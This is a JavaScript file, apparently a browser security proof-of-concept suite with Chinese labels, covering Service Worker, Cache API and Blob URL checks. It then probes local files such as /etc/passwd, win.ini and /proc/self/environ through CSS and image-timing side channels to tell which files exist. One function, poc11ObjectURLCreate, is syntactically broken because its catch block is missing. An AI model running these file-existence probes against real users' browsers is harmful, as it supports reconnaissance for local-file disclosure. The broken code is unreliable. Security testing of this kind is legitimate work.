// ==================== POC-11: SW / Cache / Blob ====================
function poc11TestServiceWorker() {
  clearPre('f11-output');
  out('f11-output','🔍 Service Worker 可用性检测\n','c-info');
  if(!('serviceWorker' in navigator)){
    out('f11-output','❌ Service Worker API 不可用\n','c-err'); return;
  }
  out('f11-output','✅ Service Worker API 可用\n','c-ok');
  out('f11-output','📍 协议: '+location.protocol+'\n','c-info');
  if(location.protocol!=='https:' && location.protocol!=='file:'){
    out('f11-output','⚠️ SW 需要 HTTPS 或 localhost/file:// 协议\n','c-warn');
  }
  // 列出已注册的 SW
  navigator.serviceWorker.getRegistrations().then(function(regs){
    out('f11-output','📋 已注册的 SW: '+regs.length+' 个\n','c-info');
    regs.forEach(function(r){
      out('f11-output','  🔧 scope: '+r.scope+' active:'+!!r.active+'\n','c-info');
    });
  }).catch(function(err){
    out('f11-output','❌ 获取 SW 列表失败: '+err.message+'\n','c-err');
  });
}

function poc11CacheTest() {
  clearPre('f11-output');
  out('f11-output','🔍 Cache API 测试\n','c-info');
  if(!('caches' in window)){
    out('f11-output','❌ Cache API 不可用\n','c-err'); return;
  }
  out('f11-output','✅ Cache API 可用\n','c-ok');
  caches.keys().then(function(names){
    out('f11-output','📋 已有缓存: '+names.length+' 个\n','c-info');
    names.forEach(function(name){
      out('f11-output','  📦 '+name+'\n','c-info');
    });
    // 尝试打开/写入一个测试缓存
    return caches.open('__poc11_test__');
  }).then(function(cache){
    out('f11-output','✅ 成功创建/打开测试缓存\n','c-ok');
    // 读取测试缓存内容
    return cache.keys();
  }).then(function(requests){
    out('f11-output','📋 测试缓存条目: '+requests.length+'\n','c-info');
    requests.forEach(function(req){
      out('f11-output','  📄 '+req.url+'\n','c-info');
    });
    // 清理测试缓存
    return caches.delete('__poc11_test__');
  }).catch(function(err){
    out('f11-output','❌ 缓存操作失败: '+err.message+'\n','c-err');
  });
}

function poc11BlobTest() {
  clearPre('f11-output');
  out('f11-output','🔍 Blob URL 构造测试\n','c-info');
  try{
    // 创建恶意内容的 Blob
    var testContent='=== 敏感文件模拟内容 ===\nhosts file content here...';
    var blob=new Blob([testContent], {type:'text/plain'});
    var url=URL.createObjectURL(blob);
    out('f11-output','✅ Blob URL 创建成功: '+url+'\n','c-ok');

    // 尝试用 XHR 读取自己的 Blob
    var xhr=new XMLHttpRequest();
    xhr.open('GET', url, false);
    try{
      xhr.send();
      out('f11-output','✅ XHR 读取 Blob 成功: '+xhr.responseText.substring(0,100)+'\n','c-ok');
    } catch(e){
      out('f11-output','❌ XHR 读取 Blob 失败: '+e.message+'\n','c-err');
    }

    // 检查是否可以将Blob URL 传递给外部
    out('f11-output','💡 Blob URL 仅在当前 origin 有效，但可通过 postMessage 传递\n','c-info');

    URL.revokeObjectURL(url);
  } catch(err){
    out('f11-output','❌ Blob 操作失败: '+err.message+'\n','c-err');
  }
}

function poc11ObjectURLCreate() {
  clearPre('f11-output');
  out('f11-output','🔍 createObjectURL 信息泄露测试\n','c-info');
  out('f11-output','💡 测试 createObjectURL 是否可用于泄漏文件内容路径\n','c-info');

  // 检查 URL.createObjectURL 的可用性和限制
  if(typeof URL!=='undefined' && 'createObjectURL' in URL){
    out('f11-output','✅ URL.createObjectURL 可用\n','c-ok');

    // 测试能否从 MediaSource 创建 URL
    if('MediaSource' in window){
      try{
        var ms=new MediaSource();

        out('f11-output','❌ MediaSource URL 创建失败: '+e.message+'\n','c-err');
      }

    // 测试是否可枚举已创建的 objectURL

    out('f11-output','💡 但如果有文件 input，可以:\n','c-info');
    out('f11-output','  1. 用户选择文件 → createObjectURL → 获得 blob: URL\n','c-info');
    out('f11-output','  2. 将 blob: URL 设为 img.src → 文件内容被解码渲染\n','c-info');
  } else {
    out('f11-output','❌ URL.createObjectURL 不可用\n','c-err');
  }
}

// ==================== POC-12: CSS/侧信道 ====================
function poc12CSSProbe() {
  clearPre('f12-output');
  out('f12-output','🎨 CSS 背景图侧信道探测\n','c-info');
  out('f12-output','💡 利用 CSS background-image 请求本地文件，通过 onload/onerror 时间差判断文件是否存在\n','c-info');

  var paths=[
    'file:///etc/passwd',
    'file:///C:/Windows/win.ini',
    'file:///C:/Windows/System32/drivers/etc/hosts',
    'file:///etc/hostname',
    'file:///proc/self/environ'
  ];

  var style=document.createElement('style');
  document.head.appendChild(style);

  paths.forEach(function(p){
    var className='poc12_'+Math.random().toString(36).substr(2,8);
    style.sheet.insertRule('.'+className+'{ background-image:url('+p+'); }', 0);

    var div=document.createElement('div');
    div.className=className;
    div.style.position='absolute';
    div.style.width='1px';
    div.style.height='1px';
    div.style.top='-9999px';
    document.body.appendChild(div);

    var start=Date.now();
    var img=new Image();
    img.onload=function(){ out('f12-output','  ✅ '+p+' → 文件存在 ('+(Date.now()-start)+'ms)\n','c-ok'); };
    img.onerror=function(){ out('f12-output','  ❌ '+p+' → 不存在或无权访问 ('+(Date.now()-start)+'ms)\n','c-err'); };
    img.src=p;
    out('f12-output','  🔍 探测: '+p+'\n','c-info');
  });
}

function poc12TimingProbe() {
  clearPre('f12-output');
  out('f12-output','⏱️ 时序侧信道探测\n','c-info');
  out('f12-output','💡 基于文件读取时间的侧信道：存在的文件读取快，不存在的文件触发DNS/超时慢\n','c-info');

  var testCases=[
    {path:'file:///etc/passwd', label:'应存在'},
    {path:'file:///NONEXIST_FILE_99999', label:'不存在'},
    {path:'file:///C:/Windows/System32/drivers/etc/hosts', label:'应存在(Win)'},
    {path:'file:///C:/NONEXIST_DIR_99999/fake.txt', label:'不存在(Win)'},
  ];

  var results=[];
  var done=0;

  testCases.forEach(function(tc){
    var start=performance.now();
    var img=new Image();
    img.onload=function(){
      var elapsed=performance.now()-start;
      results.push({path:tc.path, label:tc.label, elapsed:elapsed, status:'loaded'});
      done++; if(done===testCases.length) showResults();
    };
    img.onerror=function(){
      var elapsed=performance.now()-start;
      results.push({path:tc.path, label:tc.label, elapsed:elapsed, status:'error'});
      done++; if(done===testCases.length) showResults();
    };
    img.src=tc.path;
  });

  function showResults(){
    out('f12-output','\n📊 时序分析结果:\n','c-info');
    out('f12-output','━'.repeat(55)+'\n','');
    out('f12-output','路径'.padEnd(45)+'标签'.padEnd(15)+'耗时'.padEnd(10)+'状态\n','c-info');
    out('f12-output','━'.repeat(55)+'\n','');

    // 计算基线
    var nonExistTimes=results.filter(function(r){return r.label.indexOf('不存在')>=0;}).map(function(r){return r.elapsed;});
    var existTimes=results.filter(function(r){return r.label.indexOf('应存在')>=0;}).map(function(r){return r.elapsed;});

    results.forEach(function(r){
      var line=r.path.substring(0,42).padEnd(45)+r.label.padEnd(15)+r.elapsed.toFixed(1).padEnd(10)+r.status+'\n';
      out('f12-output',line,r.status==='loaded'?'c-ok':'c-err');
    });

    if(nonExistTimes.length && existTimes.length){
      var avgNon=nonExistTimes.reduce(function(a,b){return a+b;},0)/nonExistTimes.length;
      var avgExist=existTimes.reduce(function(a,b){return a+b;},0)/existTimes.length;
      out('f12-output','\n📈 平均耗时 — 存在: '+avgExist.toFixed(1)+'ms | 不存在: '+avgNon.toFixed(1)+'ms\n','c-info');
      if(Math.abs(avgExist-avgNon)>50){
        out('f12-output','⚠️ 存在显著时间差异，可用于侧信道攻击!\n','c-warn');
      } else {
        out('f12-output','✅ 时间差异不明显\n','c-ok');
      }
    }
  }
}
